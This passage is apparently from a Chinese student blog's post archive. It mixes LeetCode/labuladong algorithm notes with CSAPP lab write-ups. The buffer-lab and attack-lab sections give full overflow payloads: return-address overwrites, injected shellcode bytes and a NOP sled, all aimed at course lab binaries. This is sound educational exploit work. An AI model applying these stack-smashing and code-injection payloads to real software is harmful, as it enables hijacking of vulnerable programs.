unordered_set&lt;int&gt; follower; //存储关注的用户，需去重 User(int u) : userId(u) &#123; follower.insert(userId); &#125;&#125;; 为了快速通过id找到某个用户，还需一个哈希表 1unordered_map&lt;int, User*&gt; hash; 1、发推特，先查看是否有userId这个用户（以后每个操作都需要这一步），没有userId就new一个User，然后在哈希表中记录一下。找到该用户然后在其tweets内存储tweetId 2、获取推特信息，找不到userId就直接返回空结束，找到了就需要找出他的所有关注者，然后取出其中最早的10条推特，也就是stamp最大的10条。可以用一个大根堆遍历所有关注者的所有推特，或者拿一个容器暂存后排序。 3、关注，通过哈希表找到followerId节点，然后在follower中插入新关注 4、取关，通过哈希表找到followerId节点，然后在follower中擦除新关注 更彻底的OO把tweet也写成一个类，然后以链表的形式组织起来作为User类的一个属性，但大体思路类似 还有一种思路把每次发推特就把用户和推特打包成一个节点，整体形成一个链表，这样方便寻找最新的推特（越接近表头越新）无需排序，但不太OO","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"csapp-lab5","date":"2022-10-09T12:22:44.000Z","path":"2022/10/09/csapp-lab5/","text":"模拟cache那部分挺有意思，矩阵转置那部分处理点问题没做，大概了解了一下分块矩阵到的优化思路 A要实现一个cache，使用lru替换算法。在lc做过lru的题后就觉得还好了，这里不追求O(1)的时间，所以不需要哈希链表的方法，cache本质上可以看作一个二维数组，它包含多个小数组（cache行），每个小数组里面放有元素。 1、每个cache行需要包含几个属性：有效位valid（判断这个该cache行能否存入数据，为1说明旧数据可以覆盖），tag字段（该数据和地址查找的是否匹配），时间戳stamp（用于记录多久未使用了，lru需要）。本实验不关心数据的内容，所以可以忽略数据。 可以把cache行和cache如下定义： 12345678typedef struct&#123; int valid; int tag; int stamp;&#125; Line;Line **cache = NULL; 2、地址包含几个属性：tag字段（和cache的tag进行匹配），组号（标记为哪个组，长度为s），数据位数（标记行内哪个字节，长度为b），一般组都不大，可以直接遍历搜索组内的cache行，所以这里不再设置行号 为了在cache中寻址，我们需要在地址中提取出tag和组号index。 tag在最前面，地址把组号和数据位s+b右移就可以得到 行号在中间，先让地址右移b位把组号移到边上，(1 &lt;&lt; s) - 1得到s位的1，把它作为掩码相与就得到组号index了 123456789int getTag(uint64_t addr, int s, int b)&#123; return addr &gt;&gt; (s + b);&#125;int getIndex(uint64_t addr, int s, int b)&#123; return (addr &gt;&gt; b) &amp; ((1 &lt;&lt; s) - 1);&#125; 由于不关心数据内容，实验所说的存取都可以抽象为对cache的操作，只不过存是2次，取是1次，我们用updateCache表示一次操作。操作一次cache需要哪些修改？这需要分情况讨论。 若命中，把该行的stamp置0即可，表示刚访问过 若未命中，搜索组内有无空闲块，即valid=0，如果有则存在这，把tag改了，stamp置0，且valid改为1表示不可再存其他数据。如果没空闲块就需要根据lru驱逐一个，这里就要用到stamp 在index组内找含最大stamp的cache行，然后替换它。 1234567891011121314int max_stamp = INT_MIN;int max_idx = -1;for (int i = 0; i &lt; E; ++i)&#123; if (cache[index][i].stamp &gt; max_stamp) &#123; max_stamp = cache[index][i].stamp; max_idx = i; &#125;&#125;cache[index][max_idx].tag = tag;cache[index][max_idx].stamp = 0;miss++;evict++; 还有就是updateStamp，每轮操作之后都要执行一次使所有行的stmap加1 完成后编译出csim，运行test-csim，27分全通过 B在学习局部性原理时经常拿矩阵来举例，按行遍历矩阵是好的习惯，因为同行元素在内存中相邻，可以同时被加载到cache行中；按列遍历可能因为元素距离较远而反复载入cache然后驱逐出cache，使得命中率降低。 优化矩阵转置的思路类似，矩阵转置需要操作B[j] [i] = A[i] [j]，其中一方肯定是要按列遍历矩阵的。实验给的cache每行可以存储32B数据，即4个int型变量，当矩阵大小为32 * 32时，一行有32个变量无法全部存到一个cache行内，显然按列遍历会导致频繁的未命中。 如果一次性不存一整行呢？在线代中学过矩阵分块，把矩阵分成几个小矩阵，分别运算再将结果相加不会影响最终结果，矩阵转置也有相同的性质，可以转化为多个小矩阵的转置，如果每个小矩阵能全部存入cache行就能一次载入多次使用了。 每个cache行只能存4个元素，所以把矩阵划分为2 * 2的小矩阵 因技术原因（没技术），这部分结果不能展示。","comments":true,"tags":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/tags/csapp/"}]},{"title":"labuladong-图","date":"2022-10-03T07:48:50.000Z","path":"2022/10/03/labuladong-图/","text":"797.所有可能的路径，207. 课程表，210. 课程表 II，785. 判断二分图，886. 可能的二分法，130. 被围绕的区域，990. 等式方程的可满足性，1584. 连接所有点的最小费用，743. 网络延迟时间，1631. 最小体力消耗路径，1514. 概率最大的路径 797. 所有可能的路径邻接表的遍历，直接放模板如下： 1234567891011void dfs(vector&lt;vector&lt;int&gt;&gt; &amp;graph, int vertex)&#123; if(vertex...满足条件) res.push_back(); for(auto &amp;v : graph[vertex]) //遍历邻节点 &#123; path.push_back(v); dfs(graph, v, n); path.pop_back(); //回溯 &#125;&#125; 传入的参数为图，以及单个节点（不是邻节点集合）。进入函数后先判断当前节点vertex是否符合要求，然后处理其邻节点。处理完后一般要复原，所以大体上和回溯模板非常像。 207. 课程表1、dfs，类似上题的遍历方法，用visited判断是否重复，是则有环。 首先需要用给定的数据建立邻接表形式的图，然后加入dfs中，注意这里要把每个节点都当作起点dfs一次，因为有些孤立点如[1,1]。然而这样做会产生大量重复计算，每个节点都被处理多次，100个点就超时了。 考虑剪枝，我们用path代替上面的visited用于判断重复，但path只记录一条路径，它需要回溯。另外用visited记录处理过的节点，这个visited是每次dfs共用的，因为不管哪个节点是起点，处理到某个节点之后都是一样的，所以若visited过就直接return了 1234567891011if(path[course]) res = false; if(!res || visited[course]) return;visited[course] = true;path[course] = true;for(auto &amp;c : graph[course])&#123; dfs(graph, c);&#125;path[course] = false; 这种path、visited的模式经常用于求路径同时剪枝的问题。 2、bfs，dfs的方法较冗长且需要从每个节点都dfs一次。判断图是否有环的最好解法还是bfs即拓扑排序。 先统计入度，然后在队列中放入入度为0的节点，并使其邻节点入度减1，重复此步骤即可，最后能处理完所有节点说明无环，代码也很简单 12345678910111213141516for(int i = 0; i &lt; indegree.size(); i++)&#123; if(indegree[i] == 0) q.push(i);&#125;while(!q.empty())&#123; int cur = q.front(); q.pop(); cnt++; for(auto &amp;c : graph[cur]) &#123; if(--indegree[c] == 0) q.push(c); &#125;&#125; 其实dfs的本质就是前序遍历，bfs就是层序遍历，所以法1不断向下递归，而法2通过队列实现。 210. 课程表 II除了判环还要输出路径。 1、dfs，dfs的拓扑排序通过逆后序实现，这样才能先把入度为0的节点拿走。和上题的方法一样，每次dfs之后把course加入res（先递归在处理：后序），最后把res反转一下。 2、bfs更简单，把统计节点的cnt++改为收集节点的res.push_back() 785. 判断二分图把图的节点分为互不相邻的两部分，方法是涂色法：每次遍历到一个节点时就把它的邻结点涂上不同的颜色，处理完所有节点后如果还有相邻的节点同颜色则说明不是二分图。 用一个bool型的color记录每个节点颜色。一个思路是套dfs模板，遍历邻节点当判断到颜色相同时就改邻节点颜色，最后检查color数组。这样做需要把整个图处理一遍才能做判断。 其实在dfs的过程中就能顺便判断，我们不用管当前节点和邻节点是否同色， 1、只要没访问过邻节点，就把它涂成和当前节点不同的颜色color[v] = !color[vertex]， 2、只要访问过邻节点，就判断它和当前节点是否同色，若之前访问过又还是同色说明有冲突的结果（被其他节点改过），用flag标记不是二分图，后续跟进flag就能避免无谓的dfs。 注意图可能不连通，需要从每个节点开始dfs一次 12345678910111213141516if(!flag) return;visited[vertex] = true;for(auto &amp;v : graph[vertex])&#123; if(!visited[v]) &#123; color[v] = !color[vertex]; dfs(graph, v); &#125; else &#123; if(color[v] == color[vertex]) flag = false; &#125;&#125; 也可以bfs，思路一样，根据是否访问过邻节点分为两种情况 886. 可能的二分法和上题基本一样，dislike的两个点相连但可以二分。多了一步建图，把题目的数据改为邻接表形式，然后套上题的方法就可以了。 130. 被围绕的区域只有和边缘的O连通就不能改为X，所以我们需要从边缘开始dfs，先把这些连通的O改为其他字符如#，之后的O就是被X包围的了，遍历矩阵把它修改为X，同时把刚刚标记的#修改为O 二维矩阵的dfs模板如下： 1234567if(x &lt; 0 || x &gt;= m || y &lt; 0 || y &gt;= n || board[x][y] != 'O') return;board[x][y] = '#';dfs(board, x + 1, y, m, n);dfs(board, x, y + 1, m, n);dfs(board, x - 1, y, m, n);dfs(board, x, y - 1, m, n); 进入函数后就用一个if打包所有异常情况，如越界，不符条件，已访问过等。之后操作当前元素matrix[x] [y]，然后从4个方向继续dfs。 本题可以用一个小技巧省去visited数组，那就是在if判断里写board[x] [y] != ‘O’而不是board[x] [y] == ‘X’，后者遇到#也会接着dfs所以需要visited数组，而前者直接排除了#的情况。 990. 等式方程的可满足性需要记录每组相等的关系，然后再查看每组不等的关系，看是否冲突。 如何记录一组相等关系？如a=b，b=c，那三者都相等，应该接在一条路径上，我们用相连的图节点表征相等的字符。为了快速查找某两个字符是否相等，最好的方法就是并查集。 遍历方程，当两个字符相等时就把它们join一下（先- ‘a’转为数字）；再遍历方程，当两个字符不相等时判断它们是否同祖先，即在同一路径上即相等，若同祖先则 不满足。 1584. 连接所有点的最小费用最小生成树，方法很好想但怎么用代码实现？ kruskal我们需要统计每个节点之间的距离，在加入边的过程中需要判断是否成环，这需要并查集，而并查集又需要节点序号。所以我们必须把3个值打包：节点1序号，节点2序号，二者的距离。后面又需要排序找最短的边，所以用一个struct来打包。 重载&lt;用于sort降序排序 123456struct Edge &#123; int val, u, v; Edge(int a, int b, int c) : u(a), v(b), val(c) &#123;&#125; bool operator &lt;(Edge&amp; rhs) &#123;return val &lt; rhs.val;&#125;&#125;; 之后把点加入并查集判环，然后计算距离： 1234567for(auto &amp;d : distance)&#123; if(connected(d.u, d.v)) continue; join(d.u, d.v); res += d.val;&#125; 注意加入并查集的是节点序号而不是坐标，坐标只用于计算距离，没其他作用。 kruskal存边需E，并查集存点需E，空间复杂度为O(E + V) kruskal排序需时间ElogE，并查集复杂度为1，时间复杂度O(ElogE) primprim算法以点为标准，它的实现类似bfs，选择“已加入的点集”的邻节点中最小的距离。不像kruskal全局地选最小边，这里的距离需动态更新。 我们用一个distance数组记录每个节点距离“点集”的距离。为了快速选出这个最小距离，用优先队列（小根堆）保存。除了距离以外，我们还要记录节点索引，以便每次取出一个节点后能更新其邻节点（所以也要用邻接表形式）。 还有就是避免成环，kruskal用并查集，prim用一个visited数组记录，若一个点已经访问过即把相连的一条边计算过了，就不能从另一边再访问一次，这样又把一条边加入点集，那就导致成环。如下，点a已加入点集，若再访问一次就成环 ​ a ​ / [ ] 12345678910111213141516171819while(!pq.empty())&#123; auto [dist, i] = pq.top(); pq.pop(); if(visited[i]) continue; visited[i] = true; res += dist; for(auto &amp;it : graph[i]) &#123; int val = it.first; int j = it.second; if(!visited[j] &amp;&amp; val &lt; distance[j]) &#123; distance[j] = val; pq.push(make_pair(distance[j], j)); &#125; &#125;&#125; 维护大小为E的优先队列，每次操作时间复杂度为logE，每个点都要入队，故总的时间复杂度为O(ElogE) 需要实现邻接表，空间复杂度为O(E^2) 743. 网络延迟时间dijkstra算法，其实思想和prim一样，只不过prim的最近距离指的是离“点集”的距离，而dijkstra是指离起点的距离。 和prim一样先构建带距离的邻接表，之后用优先队列选出距离最小的点。这里的距离是和起点的距离，即上一个节点i和起点距离distance[i]加上当前节点j和i的距离val（邻接表计算过） 12345678910for(auto &amp;it : graph[i])&#123; int val = it.first; int j = it.second; if(distance[i] + val &lt; distance[j]) &#123; distance[j] = distance[i] + val; pq.push(make_pair(distance[j], j)); &#125;&#125; 可以看出，除了对“距离”的定义，dijkstra和prim思路和写法完全一样。 注意一个细节：piar的顺序必须是距离+节点索引，不能反过来，因为优先队列有依据第一个值排序，距离才是我们想比较的。 1631. 最小体力消耗路径求单源最短路径，但这里的最短是由路径的权值差决定的，而且图以邻接矩阵方式存储，不能用上面构建带距离的邻接表的方法。 首先需要一个距离矩阵存储到达每个点的最小体力损耗（权值差），由于会有多条路径到达一个点，这个值需要动态更新，类似dp数组。 在距离矩阵中我们求每个单元的最小值，而对于每条路径就需要求最大权值差，因为路径的体力消耗是由最大差决定的。我们用一个三元组tuple存储路径的最大权值差，和横纵坐标。 1234567891011121314151617181920212223vector&lt;vector&lt;int&gt;&gt; move = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;; //四个移动方向while(!pq.empty())&#123; auto [val, i, j] = pq.top(); pq.pop(); if(i == m - 1 &amp;&amp; j == n - 1) //到达终点 break; for(int k = 0; k &lt; 4; k++) //搜索四个方向 &#123; int x = i + move[k][0]; //新的坐标 int y = j + move[k][1]; if(x &gt;= 0 &amp;&amp; x &lt; m &amp;&amp; y &gt;= 0 &amp;&amp; y &lt; n) &#123; //更新这条路径的最大权值差 int min_effort = max(val, abs(heights[x][y] - heights[i][j])); if(min_effort &lt; distance[x][y]) //更新这个单元格的最小结果 &#123; distance[x][y] = min_effort; pq.emplace(min_effort, x, y); &#125; &#125; &#125;&#125; 需要掌握dijkstr的邻接矩阵写法，控制4个方向的写法值得学习。 1514. 概率最大的路径和网络延迟那题基本一样，把求相加的距离改为了求相乘的概率。 首先依然是构建带权的邻接表，然后是一个pair类型的优先队列，之后动态更新probability数组（即之前的distance数组），当上一节点的概率pro和本节点的val相乘大于probability数组的相应值就更新并入队。 这里注意目标是求最大概率而不是最短路径，应该使用大根堆。奇怪的是一开始用错了小根堆竟然超时了，难道小根堆比大根堆慢？","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"csapp-lab4","date":"2022-09-26T09:45:23.000Z","path":"2022/09/26/csapp-lab4/","text":"和上次lab差不多，也是利用缓冲区溢出注入代码实现跳转。 level0函数调用过程是test -&gt; getbuf -&gt; test(smoke、fizz…)，也就是getbuf读入执行完后要设法让程序跳转到smoke等函数。 先看重要的函数getbuf，它先存入了一个ebp，然后开辟了0x38即56B的栈空间，其中数组eax大小为0x28即40B。 12345678910080491f4 &lt;getbuf&gt;: 80491f4: 55 push %ebp 80491f5: 89 e5 mov %esp,%ebp 80491f7: 83 ec 38 sub $0x38,%esp 80491fa: 8d 45 d8 lea -0x28(%ebp),%eax 80491fd: 89 04 24 mov %eax,(%esp) 8049200: e8 f5 fa ff ff call 8048cfa &lt;Gets&gt; 8049205: b8 01 00 00 00 mov $0x1,%eax 804920a: c9 leave 804920b: c3 ret 为了覆盖返回地址结合上一个lab很容易想到注入40B数据，再加上smoke的地址。但和之前不同的是它这里的字符串是以字符数组的方式存储到的，所以它有一个存栈底指针的寄存器ebp占了4B，因此我们要注入44B空数据，再加上smoke的返回地址： 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 18 8c 04 08 level1要读入cookie，但是没有说从rdi读入，我们把cookie直接放到getbuf的栈里即可。于是想到读入44B空数据，再读入fizz的地址，然后是参数cookie，但测试出错。 因为进入一个函数还需要把其返回地址压栈，顺序是压入返回地址、压入参数，所以在fizz地址和cookie之间还有4B的数据（随便填）用于返回地址占位。 123456700 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 42 8c 04 0800 00 00 00 91 c9 09 7e level2这题有一个全局变量global_value，我们需要把它的值改为cookie的值，首先找到它。它在bang函数出现，bang函数里面有进行了两个数据的比较，用gdb确定它们的值，发现0x804d100处是全局变量。 128048ca3: a1 00 d1 04 08 mov 0x804d100,%eax8048ca8: 3b 05 08 d1 04 08 cmp 0x804d108,%eax 参考上次lab注入自己代码的方法，编写汇编修改global的值，然后跳转到bang处，反汇编后得到我们代码的地址 1234 0: c7 04 25 00 d1 04 08 movl $0x7e09c991,0x804d100 7: 91 c9 09 7e b: 68 9d 8c 04 08 pushq $0x8048c9d10: c3 retq 为了跳转到我们的代码地址即栈顶处，我们需要知道getbuf的esp寄存器值，由汇编知这个值是从eax来的，其值为0x55682f48 于是有答案： 123456c7 04 25 00 d1 04 08 91 c9 09 7e 68 9d 8c 04 08 c3 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 48 2f 68 55 level3和上题差不多，不过要把cookie设置为getbuf的返回值，同时还要恢复ebp的值，在getbuf打断点查看ebp为0x55682fa0，用这个值覆盖掉原来的ebp即40-44字节。于是有答案： 123456b8 91 c9 09 7e 68 be 8d04 08 c3 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00a0 2f 68 55 48 2f 68 55 level41234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606190 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90 9090 90 90 90 90 90 90 90 90b8 91 c9 09 7e 8d 6c 24 2868 3a 8e 04 08 c398 2d 68 55","comments":true,"tags":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/tags/csapp/"}]},{"title":"labuladong-二叉树","date":"2022-09-25T09:03:39.000Z","path":"2022/09/25/labuladong-二叉树/","text":"543.二叉树的直径，116. 填充每个节点的下一个右侧节点指针，114. 二叉树展开为链表，889. 根据前序和后序遍历构造二叉树，297. 二叉树的序列化与反序列化，652. 寻找重复的子树，315. 计算右侧小于当前元素的个数，493. 翻转对，327. 区间和的个数，230. 二叉搜索树中第K小的元素，450. 删除二叉搜索树中的节点，215. 数组中的第K个最大元素 543. 二叉树的直径题目不难，但体现了一些常见思路。当节点信息依赖于子节点时就需要后序遍历，本题需要知道子节点的深度才能得到当前直径，所以后续遍历，函数返回值就是当前节点的最大深度，直径则另外判断。 116. 填充每个节点的下一个右侧节点指针1、很直观的想法是层序遍历，用那个老方法先记录每层的节点数，然后处理每一层使节点指向下一个节点。 2、可以遍历，让左孩子指向右孩子，但一个问题是不同子树之间如[1,2,3,4,5,6,7]的5和6怎么连接？这里需要两个节点进行递归，dfs(root1-&gt;right, root2-&gt;left)，这样就可以跨子树连接。 114. 二叉树展开为链表一开始想先序遍历，用一个pre指示上一个节点，但这样处理会当前节点时就会用到right指针，后面就找不到右子树了。所以要从后往前操作，先序是中左右，反着就是右左中，显然这就是逆后序遍历，逆后序遍历可以安全地操作右指针，因为以后不会再用到这个指针了、我们用一个next指针指示后继节点，每次使遍历到的节点指向next，再更新next为当前节点。 889. 根据前序和后序遍历构造二叉树重建二叉树的问题，前序序列的第二个节点就是左子树的根节点，利用哈希表找到它在后序序列的位置，然后就能得到左右子树的区间了。 和另外两种重建不同的是它要找第二个节点节点pre_left + 1而不是pre_left，这就带来了一些问题，比如越界，pre_left是左子树的最后一个节点，加一后就跳到了右子树，这是不允许的，所以本题的边界判断应该使用pre_left和pre_right而不是post。 当pre_left &gt; pre_right时说明序列结束了，返回nullptr 当pre_left = pre_right时说明只剩最后一个节点，由于后续将进行pre_left + 1越界，若再继续执行将得到错误结果，此时直接返回new TreeNode(preorder[pre_left]) 297. 二叉树的序列化与反序列化以前做过，当时不熟悉字符串流，其实就是利用其遇到空格停止的特性取出每个节点的值。 注意本题最好使用先序遍历而不是层序，层序要控制边界比较麻烦，先序不管序列化还是恢复都可以简单地递归实现。 652. 寻找重复的子树非常好的题目，一开始在想怎么递归，写出了如下代码： 123456789101112131415161718if(node1 == nullptr &amp;&amp; node2 == nullptr) return true;if(node1 == nullptr || node2 == nullptr) return false;if(node1-&gt;val == node2-&gt;val)&#123; if(dfs(node1-&gt;left, node2-&gt;left) &amp;&amp; dfs(node1-&gt;right, node2-&gt;right)) &#123; res.push_back(node1); return true; &#125;&#125;dfs(node1, node2-&gt;left);dfs(node1, node2-&gt;right);dfs(node1-&gt;left, node2);dfs(node1-&gt;right, node2);return false; 感觉挺好的？两个节点值相等时后判断左右子树，然后得到一个重复子树，不相等则固定一个节点向下比较其他节点。结果也还可以，把重复子树都找到了，但…出现了重复，例如相同值的叶节点。一开始想的是用集合收集节点，但运行后发现并没有达到去重的效果，原因是二叉树节点是以指针形式储存的，也就是一串地址。虽然重复子树节点值相同但存储的地址却不同，所以set无法完成去重。 为了去重我们需要把二叉树“数值化”，节点转化为数值才能比较。这不就是上一题的序列化吗？ 使用先序遍历的序列化方法，再用一个哈希表记录字符串出现次数： 12345678if(root == nullptr) return \"#\";string s;s = to_string(root-&gt;val) + \" \" + dfs(root-&gt;left) + \" \" + dfs(root-&gt;right);if(hash[s] == 1) res.push_back(root);hash[s]++;return s; 315. 计算右侧小于当前元素的个数和剑指里面求逆序对的问题基本一样，但不是求逆序对总数而是求每个数对应的逆序对数目。由于排序的过程中数组元素的位置不断变动，使逆序对数目和元素一一对应成为新的问题。 本题用到的方法是在nums和tmp数组中额外存上数组元素的索引，即构造对象：pair&lt;nums[i], i&gt;，从大到小进行归并排序，使用tmp[i].first进行比较，当tmp[i].first &gt; tmp[j].first时，说明从 j 到 right的元素都比tmp[i]更小，tmp[i]对应的逆序对就是right - j + 1，取其索引即second，在res的索引处加上逆序对的数目。 123456if(tmp[i].first &gt; tmp[j].first)&#123; res[tmp[i].second] += right - j + 1; nums_p[k++] = tmp[i++];&#125; 注意tmp对nums_p的赋值是整体赋值nums_p[k++] = tmp[i++]，而非只赋值first，否则元素和索引将产生混乱。 493. 翻转对看起来和逆序对一样，但遇到如[1, 8, 5, 1]就会出错。可以模拟一下，第一次合并为[8, 1]和[5, 1]产生1个翻转对，但第二次合并就出问题了，判断到8大于5到小于5 * 2于是就把8移入nums中，但5后面有个1被遗漏了，少算了一个翻转对。 因此不能在合并数组的过程中计算翻转对，每个左区间的数都应该和每个右区间的数进行比较以避免遗漏。我们升序归并排序，在合并数组之前先求翻转对，用一个end指针指向右区间的数，当nums[i] &gt; 2 * nums[end]时就移动end，直到不满足条件了就说明nums[i] 有end - mid - 1个翻转对 12345678for(int i = left; i &lt;= mid; i++) &#123; while(end &lt;= right &amp;&amp; (long long)nums[i] &gt; 2 * (long long)nums[end]) &#123; end++; &#125; res += end - mid - 1; &#125; 这里的end是从上次的位置开始而非从头来过，因为数组升序，nums[i + 1]必定包含了nums[i]的翻转对。 327. 区间和的个数类似上题的方法，在合并数组前计算个数。需要快速计算区间和，想到前缀和数组，前缀和数组pre[right] - pre[left]就表示了数组left到right的元素和。要求lower-upper区间内的和，可以先求出 nums[beg] - nums[i] &lt; lower和nums[end] - nums[i] &lt;= upper的beg和end索引，二者之间的nums[beg] - nums[end]就符合lower-upper之间了，前缀数组的nums[beg] - nums[end]就是元素和，也就是说beg到end之间的区间时满足条件的。 230. 二叉搜索树中第K小的元素中序遍历过程中找第k个元素，注意要用另外的cnt记录节点序号，不能把cnt放入函数参数里面，否则每次进入递归就加1变成了计算树的深度。 450. 删除二叉搜索树中的节点以前写过但找节点太复杂了，用递归的方法更简洁。 1234567891011121314151617181920212223if(root == nullptr) return nullptr;if(root-&gt;val &lt; key)&#123; root-&gt;right = deleteNode(root-&gt;right, key);&#125;else if(root-&gt;val &gt; key)&#123; root-&gt;left = deleteNode(root-&gt;left, key);&#125;else&#123; if(root-&gt;left == nullptr) return root-&gt;right; if(root-&gt;right == nullptr) return root-&gt;left; TreeNode *min_node = getMin(root-&gt;right); root-&gt;right = deleteNode(root-&gt;right, min_node-&gt;val); min_node-&gt;left = root-&gt;left; min_node-&gt;right = root-&gt;right; root = min_node;&#125;return root; 1、root不是要找的节点，根据val和key的比较向左子树或右子树递归 2、root是要找的节点，这里涉及补位的问题。若子节点有空的，则返回另一边子树补位（包含两个子树都为空返回nullptr的情况）；若子节点都不为空，则找到右子树的最左侧节点，在右子树中删除它（也是递归删除的方式），然后用它代替root。 215. 数组中的第K个最大元素TopK问题 1、小根堆，把最大的k个数插入堆里，堆顶的就是第k大的数，在大小为k的二叉树中存取的复杂度为log(k)，共n个元素，复杂度nlog(k) 2、复杂度为O(n)的方法是快排的思路，快排每次确定一个元素的位置，我们降序排列，若某次排序完后元素的位置是k - 1，也就是它前面有k个数，说明它是第k大的元素。 利用快排的划分方法得到pivot的索引（返回索引，不再向下递归），之后用返回的索引进行类似二分法的比较，若pivot &lt; k - 1则从右侧数组找，反之亦然。 12345678910while(left &lt;= right)&#123; int pivot = quickSort(nums, left, right); //每次确定一个元素的位置 if(pivot &lt; k - 1) //pivot靠左了，往右边找 left = pivot + 1; else if(pivot &gt; k - 1) //pivot靠右了，往左边找 right = pivot - 1; else return nums[pivot]; //pivot左侧有k - 1个元素，它第k大&#125;","comments":true,"tags":[{"name":"labuladong","slug":"labuladong","permalink":"http://yoursite.com/tags/labuladong/"}]},{"title":"csapp-lab3","date":"2022-09-22T08:53:54.000Z","path":"2022/09/22/csapp-lab3/","text":"本次lab的内容是利用程序的缓冲区溢出攻击程序。程序进行函数调用时会先把返回地址压入栈中，然后读入数据至缓冲区，若没有防止溢出的机制，过长的输入将覆盖返回地址，从而将程序导向其他地方（bomb！） level1从官方的手册可知，程序首先执行test()，在函数内调用getbuf()读入字符串然后结束返回test()，打印no exploit，我们要做的就是在打印no exploit之前将程序引向touch1引爆炸弹。 从getbuf入手，让它跳转至touch而非返回，来看getbuf的代码（先objdump ctarget） 123456700000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 move %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq getbuf开辟0x28即40B的栈空间即缓冲区，用get读入字符串后返回，当然在开辟空间前还进行了test地址压栈。知道了这个栈帧情况就很容易攻击了，可以先读入40B字符，然后再读入touch1的地址，读入数据大于40B导致缓冲区溢出，最后读入的touch1地址将覆盖test的地址。 touch1的地址是0x4017c0，考虑小端存储答案为： 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 00 00 00 00 level2touch2需要读入一个参数，当参数为cookie时才能通过，根据提示知参数存在rdi里。源代码里没有输入cookie的语句，所以我们要自己编写相关代码，然后注入代码的地址，让程序执行指定的代码。 注入的代码应该实现两个功能：1、把cookie值移动到rdi中，2、跳转到touch2处 123movq $0x59b997fa, %rdipushq $0x4017ecret 使用gcc生成.o目标文件，然后反汇编生成汇编代码： 1230: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi7: 68 ec 17 40 00 pushq $0x4017ecc: c3 retq 这样就得到了我们的代码的地址，但怎么让程序执行它们（跳到该地址）呢？可以参考上一题借用test的返回地址，用这些地址的地址覆盖test的返回地址。这些地址的地址是什么？它们保存在getbuf的栈帧里，地址就是栈顶指针rsp的值。 利用gdb在getbuf分配完栈空间后即0x4017ac处打断点，r执行之后info r rsp查看执行完getbuf后rsp的值，得到结果为0x5561dc78。所以我们在前40B保存我们代码的地址，再利用缓冲区溢出覆盖test的返回地址，使程序到我们制定的地址执行我们的代码。 48 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 level3本关也需要输入字符串然后匹配，touch3要读入字符串的地址，cookie存在哪？手册提示hexmatch使用了栈随机化，很可能覆盖getbuf的栈空间，应该把cookie存在test的栈帧里。 利用上面info r rsp的方法找到test的rsp指针0x5561dca8，要把cookie存到此处，在编写自己的代码是就把该地址放入rdi寄存器，touch3的地址是0x4018fa，所以汇编写成： 123movq $0x5561dca8, %rdipushq $0x4018faret 反汇编后得到代码地址，同样要用gebuf的栈顶地址0x5561dc78覆盖test的返回地址，以便执行这些代码，然后读入cookie（要转为ascii码） 48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 